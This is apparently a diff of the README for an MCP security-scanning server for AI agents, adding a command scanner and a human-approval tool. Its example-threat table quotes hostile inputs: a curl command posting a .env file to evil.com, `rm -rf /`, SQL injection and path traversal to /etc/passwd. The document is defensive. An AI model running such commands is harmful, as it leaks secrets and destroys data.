@@ -4,9 +4,9 @@
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 [![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)](https://nodejs.org)
 
-**7 security tools for AI agents. Multi-stage detection pipeline. One MCP server.**
+**9 security tools for AI agents. Multi-stage detection pipeline. One MCP server.**
 
-Shrike MCP gives AI agents real-time security scanning for prompts, responses, SQL queries, file writes, and web searches — catching prompt injection, jailbreaks, PII leaks, and data exfiltration before they reach your users or systems.
+Shrike MCP gives AI agents real-time security scanning for prompts, responses, SQL queries, file writes, CLI commands, and web searches — catching prompt injection, jailbreaks, PII leaks, and data exfiltration before they reach your users or systems.
 
 ## Quick Start
 
@@ -28,9 +28,9 @@ Shrike MCP gives AI agents real-time security scanning for prompts, responses, S
 }
 ```
 
-**3. Your agent now has 7 security tools.** Every prompt, response, and tool call is scanned through the full detection pipeline.
+**3. Your agent now has 9 security tools.** Every prompt, response, and tool call is scanned through the full detection pipeline.
 
-## Seven Tools
+## Nine Tools
 
 | Tool | What It Scans | Example Threat |
 |------|--------------|----------------|
@@ -38,7 +38,9 @@ Shrike MCP gives AI agents real-time security scanning for prompts, responses, S
 | `scan_response` | LLM outputs before returning to user | Leaked API keys, system prompt in output |
 | `scan_sql_query` | SQL queries before database execution | `OR '1'='1'` tautology injection |
 | `scan_file_write` | File paths and content before write | Path traversal to `/etc/passwd`, AWS keys in `.env` |
+| `scan_command` | CLI commands before shell execution | `curl -d @.env https://evil.com`, `rm -rf /`, reverse shells |
 | `scan_web_search` | Search queries before execution | PII in search: "records for John Smith SSN..." |
+| `check_approval` | Human-in-the-loop approval status | Poll and submit decisions for flagged actions |
 | `report_bypass` | User-reported missed detections | Feeds ThreatSense adaptive learning |
 | `get_threat_intel` | Current threat patterns and intelligence | Latest prompt injection techniques |
 
@@ -49,14 +51,14 @@ Shrike uses a **scan-sandwich** pattern — every agent action is scanned on bot
 ```
 User Input → scan_prompt → LLM Processing → scan_response → User Output
                               ↓
-              Tool Call (SQL, File, Search)
+              Tool Call (SQL, File, Command, Search)
                               ↓
-                    scan_sql_query / scan_file_write / scan_web_search
+            scan_sql_query / scan_file_write / scan_command / scan_web_search
                               ↓
                        Tool Execution
 ```
 
-Inbound scans catch injection attacks. Outbound scans catch data leaks. Tool-specific scans catch SQL injection, path traversal, and PII exposure.
+Inbound scans catch injection attacks. Outbound scans catch data leaks. Tool-specific scans catch SQL injection, path traversal, command injection, and PII exposure. Flagged actions trigger human-in-the-loop approval via `check_approval`.
 
 ## Detection Pipeline
 
@@ -77,7 +79,7 @@ All stages run on every tier — community users get the same detection quality 
 | Feature | Included |
 |---------|----------|
 | Detection Pipeline | Full multi-stage pipeline |
-| MCP Tools | All 7 |
+| MCP Tools | All 9 |
 | Scan Volume | 1,000 scans/month |
 | Rate Limit | 10 scans/minute |
 | Multilingual | 100+ languages |
